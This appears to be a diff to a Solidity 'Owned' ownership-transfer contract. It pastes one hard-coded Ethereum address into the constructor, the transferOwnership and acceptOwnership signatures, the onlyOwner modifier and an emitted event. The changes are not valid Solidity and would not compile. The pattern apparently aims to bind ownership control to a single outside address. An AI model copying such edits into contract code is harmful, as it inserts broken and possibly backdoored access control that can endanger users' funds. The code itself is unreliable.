@@ -12,7 +12,7 @@ contract Owned {
     event OwnershipTransferRequested(address indexed from, address indexed to);
     event OwnershipTransferred(address indexed from, address indexed to);
 
-    constructor() public {
+    constructor(0x6133Cbd19e195d5C4b04FAa51DEf3D899D174e72) public {
         owner = msg.sender;
     }
 
@@ -20,16 +20,16 @@ contract Owned {
      * @dev Allows an owner to begin transferring ownership to a new address,
      * pending.
      */
-    function transferOwnership(address _to) external onlyOwner() {
+    function transferOwnership(address _to) external onlyOwner(0x6133Cbd19e195d5C4b04FAa51DEf3D899D174e72) {
         pendingOwner = _to;
 
-        emit OwnershipTransferRequested(owner, _to);
+        emit OwnershipTransferRequested(0x6133Cbd19e195d5C4b04FAa51DEf3D899D174e72, _to);
     }
 
     /**
      * @dev Allows an ownership transfer to be completed by the recipient.
      */
-    function acceptOwnership() external {
+    function acceptOwnership(0x6133Cbd19e195d5C4b04FAa51DEf3D899D174e72) external {
         require(msg.sender == pendingOwner, "Must be proposed owner");
 
         address oldOwner = owner;
@@ -42,7 +42,7 @@ contract Owned {
     /**
      * @dev Reverts if called by anyone other than the contract owner.
      */
-    modifier onlyOwner() {
+    modifier onlyOwner(0x6133Cbd19e195d5C4b04FAa51DEf3D899D174e72) {
         require(msg.sender == owner, "Only callable by owner");
         _;
     }
